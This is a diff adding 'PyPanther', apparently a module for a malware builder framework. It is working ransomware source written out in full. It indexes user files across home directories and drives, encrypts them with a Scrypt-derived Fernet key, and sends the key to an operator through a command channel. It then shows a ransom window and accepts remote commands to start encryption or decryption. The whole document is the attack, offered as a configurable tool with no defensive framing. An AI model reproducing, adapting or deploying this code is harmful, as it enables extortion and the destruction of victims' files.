@@ -1,0 +1,450 @@
+#!name##PyPanther
+#!itemType##module
+#!fileType##PY_MOD
+#!info##A ransomware module written in Python. It encrypts files, sends the encryption key to the server, and displays a popup window informing about the infection with an input field for the decryption key; decryption can also be triggered remotely. Files are indexed using three filters: by file extensions, by ignoring specific substrings in directory names, and by checking whether a given string appears in the filename. Warning: use caution during testing, as you may encrypt your own files.
+#!hiveType##PyExM
+#!lang##python
+#!pyType##module
+#!Var##PAN_file_ext##jpg##File extensions to search for. List extensions separated by commas ",". Using "*" in this parameter disables extension filtering entirely.##str
+#!Var##PAN_file_name##*##Files are indexed based on the presence of specified words in their filenames. Enter names separated by commas ",". Using "*" in this parameter causes filenames to be ignored.##str
+#!Var##PAN_ban_dir##.vscode, lib, pkp, .cache##Directory names to ignore during scanning. By default, directories such as "windows", "temp", "venv", etc. are ignored. Adding custom directories will extend the default ignore list. If you want no directories to be considered at all (including defaults), use "*". If you want only the default ignored directories, leave this field empty (default behavior). Separate custom directory names with commas ",".
+#!Var##Pan_messages##If you want to recover your files contact: example@gmail.com##The message that will be displayed in the window when all files are encrypted.
+#!Var##PAN_auto_start##True##Determines whether encryption starts automatically on launch or must be triggered remotely. Accepted values are "True" or "False".##str
+#!Var##PAN_password##supersecretpassword##A string of characters (password) that will be used to generate the encryption key.##str
+#!Var##PAN_salt_size##16##Size of salt attached to the password. Typical value: 8, 16, 32##str
+#!Var##PAN_enc_ext##.encrypted##File extension of encrypted files.##str
+#!Var##PAN_encrypt##fast##Encryption mode. "slow" - Files are encrypted sequentially, one by one. "fast" - Files are encrypted concurrently using multiple threads.
+#!Var##PAN_th_num##20##Number of threads used for encryption when operating in "fast" mode.##str
+
+{% set PAN_FILE_EXT = pyTOOL.buildListStr(PAN_file_ext, ",") %}
+{% set PAN_FILE_NAME = pyTOOL.buildListStr(PAN_file_name, ",") %}
+{% set PAN_BAN_DIR = pyTOOL.buildListStr(PAN_ban_dir, ",") %}
+{% if PAN_auto_start == "True" or PAN_auto_start == True %}
+    {% set PAN_AUTO_START = True %}
+{% else %}
+    {% set PAN_AUTO_START = False %}
+{% endif %}
+
+{% if PAN_encrypt == "fast" %}
+    {% set PAN_ENCRYPT = True %}
+{% else %}
+    {% set PAN_ENCRYPT = False %}
+{% endif %}
+
+import os
+import base64
+import tkinter
+import threading
+import string
+import secrets
+import pathlib
+import random
+import platform
+from typing import Union
+from time import sleep
+
+
+import cryptography
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+
+
+class Niffler:
+    def __init__(self):
+        self.pause_thread = 1
+        self.pause_check_thread = 0.5
+        # user target file name
+        self.TARGET_FILE_NAME = {{PAN_FILE_NAME}}
+        # user banned dirs name
+        self._BANNED_DIR = {{PAN_BAN_DIR}}
+        self.LOCK_FILES = threading.Lock()
+        self.LOCK_THREAD = threading.Lock()
+        self._TARGET_FILES = set()
+        self.TARGET_FILE_EXT = {{PAN_FILE_EXT}}
+        if self.TARGET_FILE_EXT[0] == "*":
+            self.FLAG_ignore_file_ext = True
+        else:
+            self.FLAG_ignore_file_ext = False
+            for i, ext in enumerate(self.TARGET_FILE_EXT):
+                if ext[0] != ".":
+                    self.TARGET_FILE_EXT[i] = f".{self.TARGET_FILE_EXT[i]}"
+        
+        if self.TARGET_FILE_NAME[0] == "*":
+            self.FLAG_ignore_file_name = True
+        else:
+            self.FLAG_ignore_file_name = False
+
+        self._BANNED_DIR.extend(self.defaultBanDirs())
+        if self._BANNED_DIR[0] == "*":
+            self.BANNED_DIR = []
+            self.FLAG_ignore_banned_dir = True
+        else:
+            self.FLAG_ignore_banned_dir = False
+            self.BANNED_DIR = self._BANNED_DIR
+
+        self.USER_WORK_START_PATH = ["*"]
+        if self.USER_WORK_START_PATH[0] == "*":
+            self.WORK_START_PATH = self.startPath()
+        else:
+            self.WORK_START_PATH = self.USER_WORK_START_PATH
+        self.TH_scan = []
+        print(self.TARGET_FILE_EXT)
+        
+    @property
+    def isScanComplete(self) -> bool:
+        if self.checkScanThread():
+            return False
+        else:
+            return True
+
+    @property
+    def TARGET_FILES(self) -> list:
+        with self.LOCK_FILES:
+            return list(self._TARGET_FILES)
+    
+    def resetTargets(self) -> None:
+        self._TARGET_FILES = set()
+    
+    def defaultBanDirs(self) -> list:
+        default_ban_list = ["Windows", "windows", "temp", "Temp", "TEMP", "tmp", "TMP", "Program Files", "venv"]
+        return default_ban_list
+    
+    def addTargetFile(self, fpath: str) -> None:
+        with self.LOCK_FILES:
+            self._TARGET_FILES.add(fpath)
+    
+    def addThread(self, th: threading.Thread) -> None:
+        with self.LOCK_THREAD:
+            self.TH_scan.append(th)
+
+    def startPath(self) -> list:
+        stpath = []
+        stpath.append(pathlib.Path.home())
+        if platform.system().lower() == "linux":
+            stpath.extend(["/media", "/mnt", "/var"])
+        else:
+            stpath.extend([os.environ.get("APPDATA"), os.environ.get("LOCALAPPDATA"), os.environ.get("PUBLIC"), os.environ.get("PROGRAMDATA"), os.environ.get("ONEDRIVE")])
+            for c in string.ascii_lowercase:
+                if os.path.exists(f"{c}:/"):
+                    stpath.append(f"{c}:/")
+        return stpath
+    
+    def checkFileName(self, raw_name: str) -> bool:
+        if raw_name in self.TARGET_FILE_NAME:
+            return True
+        else:
+            return False
+
+    def checkFile(self, fpath: str) -> bool:
+        fname = os.path.basename(fpath)
+        rname, fext = os.path.splitext(fname)
+        if not self.FLAG_ignore_file_name:
+            if not self.checkFileName(rname):
+                return False
+        if not self.FLAG_ignore_file_ext:
+            if not fext in self.TARGET_FILE_EXT:
+                return False
+        if not self.FLAG_ignore_banned_dir:
+            for bd in self.BANNED_DIR:
+                if bd in os.path.split(fpath)[0]:
+                    return False
+        return True
+    
+    def checkDir(self, dir_path: str) -> bool:
+        cname = os.path.split(dir_path)
+        if cname[1].lower() in self.BANNED_DIR:
+            return False
+        else:
+            return True
+    
+    def scanDir(self, dir_path: str) -> None:
+        for root, dirs, files in os.walk(dir_path):
+            for f in files:
+                fpath = os.path.join(root, f)
+                if self.checkFile(fpath):
+                    self.addTargetFile(fpath)
+
+    def scanStartDirs(self, dir_path: str) -> None:
+        for mdir in os.listdir(dir_path):
+            mdir_path = os.path.join(dir_path, mdir)
+            if os.path.isdir(mdir_path):
+                th = threading.Thread(target=self.scanDir, args=(mdir_path, ))
+                th.start()
+                self.addThread(th)
+            else:
+                if self.checkFile(mdir_path):
+                    self.addTargetFile(mdir_path)
+
+    def _findTargetFiles(self) -> None:
+        for sd in self.WORK_START_PATH:
+            th = threading.Thread(target=self.scanStartDirs, args=(sd, ))
+            th.start()
+            self.addThread(th)
+        
+    def findTargetFiles(self) -> None:
+        self.TH_scan = []
+        main_TH = threading.Thread(target=self._findTargetFiles)
+        main_TH.start()
+        sleep(self.pause_thread)
+        while self.checkScanThread():
+            sleep(self.pause_check_thread)
+        
+    def checkScanThread(self) -> bool:
+        with self.LOCK_THREAD:
+            for th in self.TH_scan:
+                if th.is_alive():
+                    return True
+        return False
+        
+    def start(self) -> None:
+        self.findTargetFiles()
+
+
+
+class PyPanther:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.niffler = Niffler()      
+        self.CHECK_FILE_NAME = "{{randTOOL.genString(14)}}.txt"
+        self.CHECK_FILE_PATH = self.buildCheckWorkPath()
+        self.FLAG_decryption_working = False
+        self.KEY = None
+        self.SALT_SIZE = {{PAN_salt_size}}
+        self.ENCYRPT_FILE_EXT = "{{PAN_enc_ext}}"
+        self.PASSWORD = "{{PAN_password}}"
+        self.PAUSE_CHECK = 1
+        self.PAUSE_BEFORE_START = 2
+        self.AUTO_START = {{PAN_AUTO_START}}
+        self.FAST_ENCRYPTION = {{PAN_ENCRYPT}}
+        self.FAST_MODE_TH = {{PAN_th_num}}
+        self.TEXT_ENCRYPTION = "{{PAN_messages}}"
+
+    
+
+        
+    
+    ######## CHECK FILE #######
+    
+    def buildCheckWorkPath(self) -> str:
+        if platform.system().lower() == "linux":
+            return os.path.join(pathlib.Path.home(), f".{self.CHECK_FILE_NAME}")
+        else:
+            return os.path.join(pathlib.Path.home(), self.CHECK_FILE_NAME)
+    
+    def makeCheckWorkFile(self) -> bool:
+        try:
+            with open(self.CHECK_FILE_PATH, "wb") as file:
+                file.write(b"")
+            return True
+        except:
+            return False
+    
+    def checkWorkFile(self) -> bool:
+        if os.path.exists(self.CHECK_FILE_PATH):
+            return True
+        else:
+            return False
+    
+    def deleteCheckFile(self) -> bool:
+        try:
+            os.remove(self.CHECK_FILE_PATH)
+            return True
+        except:
+            return False
+    #####################################################################
+
+    ##### Screen ########
+
+    def _checkDecKey(self, tk_wtxt: object, elabel: object) -> None:
+        if self.FLAG_decryption_working:
+            elabel.config(text="Decryption still working....")
+            return
+        dkey = tk_wtxt.get('1.0', 'end-1c')
+        if len(dkey.strip(" ")) == 0:
+            elabel.config(text="Wrong KEY !!!!!")
+        else:
+            elabel.config(text="Start decryption process.....")
+            self.decryptFiles(dkey, elabel)
+            
+
+
+    def _buildWarnWindow(self) -> None:
+        window = tkinter.Tk()
+        window.geometry("800x500")
+        window.title(self.worm.name)
+        window.configure(bg="red")
+        mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
+        mlabel.pack(pady=25)
+        tlabel = tkinter.Label(window, text=self.TEXT_ENCRYPTION, font=("Arial", 16))
+        tlabel.pack(pady=30)
+        elabel = tkinter.Label(window, text="", bg="red", font=("Arial", 14), fg="black")
+        elabel.pack(pady=60)
+        dlabel = tkinter.Label(window, text="Decrypt Key", font=("Arial", 16))
+        dlabel.pack(pady=10)
+        wtxt = tkinter.Text(window, height=1, width=64, bg="white", fg="black")
+        wtxt.pack(pady=5)
+        dbutt = tkinter.Button(window, text="DECRYPT", command=lambda: self._checkDecKey(wtxt, elabel))
+        dbutt.pack()
+        window.mainloop()
+
+    def buildWarnWindow(self) -> None:
+        ww = threading.Thread(target=self._buildWarnWindow)
+        ww.start()
+
+    #####################################################################
+
+    def setKEY(self, key: str) -> None:
+        self.KEY = key 
+
+
+    def findEncryptedFiles(self) -> None:
+        oldExt = self.niffler.TARGET_FILE_EXT.copy()
+        self.niffler.TARGET_FILE_EXT = [self.ENCYRPT_FILE_EXT]
+        self.niffler.start()
+    
+    def _decryptFiles(self, key: str, empty_label: object = None) -> None:
+        if self.FLAG_decryption_working:
+            return
+        self.FLAG_decryption_working = True
+        self.niffler.resetTargets()
+        self.setKEY(key)
+        oldExt = self.niffler.TARGET_FILE_EXT.copy()
+        self.niffler.TARGET_FILE_EXT = [self.ENCYRPT_FILE_EXT]
+        self.niffler.findTargetFiles()
+        for tf in self.niffler.TARGET_FILES:
+            self.decryptFile(tf)
+        self.FLAG_decryption_working = False
+        self.deleteCheckFile()
+        if empty_label:
+            empty_label.config(text="DECRYPTION COMPLETE.")
+    
+    def decryptFiles(self, key: str, empty_label: object = None) -> None:
+        dth = threading.Thread(target=self._decryptFiles, args=(key, empty_label))
+        dth.start()
+
+    def generateKey(self) -> None:
+        salt = secrets.token_bytes(self.SALT_SIZE)
+        kdf = Scrypt(salt, length=32, n=2**14, r=8, p=1)
+        kdf = kdf.derive(self.PASSWORD.encode())
+        self.KEY = base64.urlsafe_b64encode(kdf)
+    
+    def encryptFile(self, target: str) -> None:
+        f = Fernet(self.KEY)
+        try:
+            with open(target, "rb") as file:
+                data = file.read()
+        except:
+            return
+        edata = f.encrypt(data)
+        new_name = f"{target}{self.ENCYRPT_FILE_EXT}"
+        try:
+            os.rename(target, new_name)
+        except:
+            return
+        try:
+            with open(new_name, "wb") as file:
+                file.write(edata)
+        except:
+            os.rename(new_name, target)
+    
+    def decryptFile(self, target: str) -> None:
+        f = Fernet(self.KEY)
+        try:
+            with open(target, "rb") as file:
+                edata = file.read()
+            data = f.decrypt(edata)
+            fname = target.rstrip(self.ENCYRPT_FILE_EXT)
+            os.rename(target, fname)
+            with open(fname, "wb") as file:
+                file.write(data)
+        except:
+            pass
+    
+    def slowEncryption(self) -> None:
+        for tf in self.niffler.TARGET_FILES:
+            self.encryptFile(tf)
+        self.makeCheckWorkFile()
+        self.buildWarnWindow()
+    
+    def _sliceTargets(self) -> list:
+        return [self.niffler.TARGET_FILES[i::self.FAST_MODE_TH] for i in range(self.FAST_MODE_TH)]
+    
+    def _encryptFiles(self, targets: list) -> None:
+        for t in targets:
+            self.encryptFile(t)
+    
+    def fastEncryption(self) -> None:
+        fTh = []
+        for part in self._sliceTargets():
+            th = threading.Thread(target=self._encryptFiles, args=(part, ))
+            th.start()
+            fTh.append(th)
+        while True:
+            for t in fTh:
+                if t.is_alive():
+                    continue
+            break
+        self.makeCheckWorkFile()
+        self.buildWarnWindow()
+
+    def startEncryption(self) -> None:
+        while not self.niffler.isScanComplete:
+            sleep(self.PAUSE_CHECK)
+        if self.checkWorkFile():
+            self.worm.send_msg("This machine is already encrypted.")
+            self.buildWarnWindow()
+            return
+        # check connection
+        while not self.worm.is_conn:
+            sleep(self.PAUSE_CHECK)
+        self.generateKey()
+        self.sendKey()
+        if self.FAST_ENCRYPTION:
+            self.fastEncryption()
+        else:
+            self.slowEncryption()
+    
+    def sendKey(self) -> None:
+        if not self.KEY:
+            self.worm.send_msg("KEY is not generated.")
+            return
+        self.worm.send_msg(f"PyPanther KEY: {self.KEY.decode()}")
+    
+    def setNewKey(self, key: str) -> None:
+        self.KEY = key.encode()
+        self.worm.send_msg("New Key has been set.")
+
+    
+    def exec_cmd(self, cmd: str) -> None:
+        com = cmd.split(" ")
+        match com[0]:
+            case "pan-key":
+                self.sendKey()
+            case "pan-set-key":
+                self.setNewKey(com[1])
+            case "pan-start":
+                self.startEncryption()
+            case "pan-decrypt":
+                self.decryptFiles(self.KEY)
+            case "pan-reset":
+                self.deleteCheckFile()
+    
+    def help(self) -> str:
+        h = "'pan-key' - Show encryption key.\n"
+        h += "'pan-set-key [key]' - Set KEY.\n"
+        h += "'pan-start' - Start Encryption files.\n"
+        h += "'pan-decrypt' - Start Decrypt files.\n"
+        h += "'pan-reset' - Resets the check to see if the machine was encrypted.\n"
+        return h
+
+
+    def start(self) -> None:
+        sleep(self.PAUSE_BEFORE_START)
+        self.worm.send_msg("Panther start indexing files......")
+        self.niffler.start()
+        if self.AUTO_START:
+            self.startEncryption()
+
+
+        
